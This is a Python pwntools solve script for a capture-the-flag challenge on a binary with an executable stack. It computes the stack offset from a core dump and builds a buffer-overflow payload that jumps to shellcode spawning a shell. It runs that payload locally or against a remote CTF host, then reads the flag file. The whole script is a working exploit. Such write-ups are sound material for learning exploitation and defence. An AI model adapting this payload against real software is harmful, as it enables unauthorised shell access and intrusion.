#!/usr/bin/env python3
'''
WhatTheFuzz's submission for the <CTF> challenge <name>.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
'''

from pwn import *

exe = ELF('executable_stack')

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']


def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('b4cc89a7ed55ac0b.247ctf.com', 50105)

    else:
        io = process([exe.path])

    return io


def get_offset():
    '''Return the offset from where our input is stored on the stack to the
    return address.
    '''

    with process([exe.path]) as io:

        # Send the cyclic pattern.
        io.sendlineafter(b'You can try to make your own though:', cyclic(500))
        io.wait()

        # Open the core file.
        core = io.corefile

        # Get the faulting address.
        fault = core.fault_addr
        log.info(f'The faulting address is: {hex(fault)}')

    # Search for the pattern to get the offset.
    offset = cyclic_find(fault)

    return offset


def main():
    '''Return the flag.
    '''

    offset = get_offset()  # yields 140
    log.info(f'The offset is: {offset}')

    # Load some ROP gadgets to find a jmp esp.
    rop = ROP(exe)

    # Create a payload that will open a shell.
    payload = fit({
        offset: p32(rop.jmp_esp.address),
        offset + 4: asm(shellcraft.linux.sh())
    })

    with conn() as io:

        # Send the payload.
        io.sendlineafter(b'You can try to make your own though:', payload)
        io.sendline(b'cat flag*.txt')
        flag = io.recvregexS(rb'247CTF{.*?}')
        log.success(f'The flag is: {flag}')
        return flag


if __name__ == '__main__':
    main()
